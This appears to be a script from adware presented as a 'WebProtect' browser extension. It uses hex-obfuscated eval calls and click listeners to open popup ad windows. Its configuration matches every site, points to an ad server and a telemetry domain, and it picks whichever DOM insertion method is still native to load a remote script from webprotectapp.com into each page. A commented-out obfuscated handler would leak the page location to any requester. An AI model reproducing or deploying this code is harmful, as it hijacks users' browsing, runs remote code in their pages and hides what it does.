window["__clbRegister"] = [];
window["\x77\x6f\x6d\x62\x61\x74"] = window["\x65\x76\x61\x6c"]("\x77\x69\x6e\x64\x6f\x77\x5b\x22\x65\x76\x61\x6c\x22\x5d\x28\x22\x77\x69\x6e\x64\x6f\x77\x2e\x6f\x70\x65\x6e\x22\x29\x3b");

var f = function (e) {
        var a = window["__clbRegister"],
            i = 0;

        for (; i < a.length; i++) a[i](e);
    },
    ev = "mouseup";

if (window.chrome)
    ev = "mousedown";

if (document.documentElement.addEventListener)
    document.documentElement.addEventListener(ev, f, true);
else
    document.documentElement.attachEvent("on" + ev, f, true);

/*
if(typeof window["\x55\x54\x4d\x65\x73\x73\x61\x67\x65\x48\x61\x6e\x64\x6c\x65\x72\x41\x74\x74\x61\x63\x68\x65\x64"]=="\x75\x6e\x64\x65\x66\x69\x6e\x65\x64"){var x=function(n,t,i){n["\x61\x74\x74\x61\x63\x68\x45\x76\x65\x6e\x74"]?n["\x61\x74\x74\x61\x63\x68\x45\x76\x65\x6e\x74"]("\x6f\x6e"+t,i):n["\x61\x64\x64\x45\x76\x65\x6e\x74\x4c\x69\x73\x74\x65\x6e\x65\x72"](t,i)}(window,"\x6d\x65\x73\x73\x61\x67\x65",function(n){if(typeof n["\x64\x61\x74\x61"]!="\x75\x6e\x64\x65\x66\x69\x6e\x65\x64"&&n["\x64\x61\x74\x61"]!=null){var t={"\x6c\x6f\x63\x61\x74\x69\x6f\x6e":document["\x6c\x6f\x63\x61\x74\x69\x6f\x6e"].toString()},i=n["\x64\x61\x74\x61"].toString().indexOf("\x67\x65\x74\x4c\x6f\x63\x61\x74\x69\x6f\x6e")>-1;(i||n["\x64\x61\x74\x61"]["\x67\x65\x74\x4c\x6f\x63\x61\x74\x69\x6f\x6e"])&&n["\x73\x6f\x75\x72\x63\x65"]["\x70\x6f\x73\x74\x4d\x65\x73\x73\x61\x67\x65"](i?window["\x4a\x53\x4f\x4e"]["\x73\x74\x72\x69\x6e\x67\x69\x66\x79"](t):t,n["\x6f\x72\x69\x67\x69\x6e"])}});window["\x55\x54\x4d\x65\x73\x73\x61\x67\x65\x48\x61\x6e\x64\x6c\x65\x72\x41\x74\x74\x61\x63\x68\x65\x64"]=1}
*/

window['__PartnerData'] = ({
    partnerId: "webprotect", services:
        {
            popup: {
                partnerData_attributeName: "webprotect_data",
                bg_frameId: "pu-bg-applon",
                bg_domain: "static.webprotectapp00.webprotectapp.com",
                blacklist: [],
                whitelist: [/.+/i],
                ad_server_domain: "ad.webprotectapp00.webprotectapp.com",
                telemetry_domain: "telemetry.webprotectapp00.webprotectapp.com",
                telemetry_sample_rate: 10,
                adWindow_name_prefix: "TVEInjectAdWindow-webprotect",
                ad_delivery_interval: 3,
                repeat_request_interval: 3,
                controller_run_interval: 5000,
                // for ad labeling
                ad_lbl_style: "position:fixed;box-shadow: 0px 0px 3px 1px #aaaaaa;line-height:normal;text-shadow: 2px 2px 5px #988;margin:0px;padding-top:3px;text-align:center;z-index:2147483647;color:#000000;font-family:\'verdana\';font-size:12px;top:0px;left:0px;width:100%;height:20px;background-color:#eeeeee;",
                ad_lbl_content: "You've received a premium offer from WebProtect.  Click <a href=\"http://webprotectapp.com/contact\" target=\"_blank\" style='text-decoration:underline;color:#0000FF;'>here</a> to learn more."
            }}
})

var syrng_directory = "//static.webprotectapp00.webprotectapp.com/apps/",
    j = 0, syrng_cb = 22, UUDDLRLRBASS_config = 1821637315,
    nativePattern = /\[native code\]/i, syrng_winID = ((typeof window.syrng_winID == "undefined") ? Math.floor(Math.random() * 1000000000).toString(36) : window.syrng_winID),
    syrng_injectables = [
        {
            t: function () { return (!document.body.appendChild.toString || nativePattern.test(document.body.appendChild.toString())); },
            f: function (script) { document.body.appendChild(script); }
        },
        {
            t: function () { return nativePattern.test(document.body.replaceChild.toString()); },
            f: function (script) { document.body.insertAdjacentHTML("beforeend", "<div id=\"replaceMe\" style=\"display: none;\"></div>"); document.body.replaceChild(script, document.body.lastChild);}
        },
        {
            t: function () { return (document.body.insertAdjacentElement && nativePattern.test(document.body.insertAdjacentElement.toString())); },
            f: function (script) { document.body.insertAdjacentElement("beforeend", script);}
        },
        {
            t: function () { return nativePattern.test(document.write.toString()); },
            f: function (script) { document.write("<script type=\"text/javascript\" src=\""+script.getAttribute("src")+"\"></scr"+"ipt>"); }
        },
        {
            t: function () { return true },
            f: function (script) { }
        }
    ],
    syrng_files = ["tv-classic/tv-classic-noboot-fg.js"];

for (; j < syrng_files.length; j++) {
    var script = document.createElement("script"),
        i = 0;
    script.type = "text/javascript";
    script.src = syrng_directory + syrng_files[j] + "?cb=" + syrng_cb;

    while (!syrng_injectables[i].t())
        i++;

    syrng_injectables[i].f(script);
}
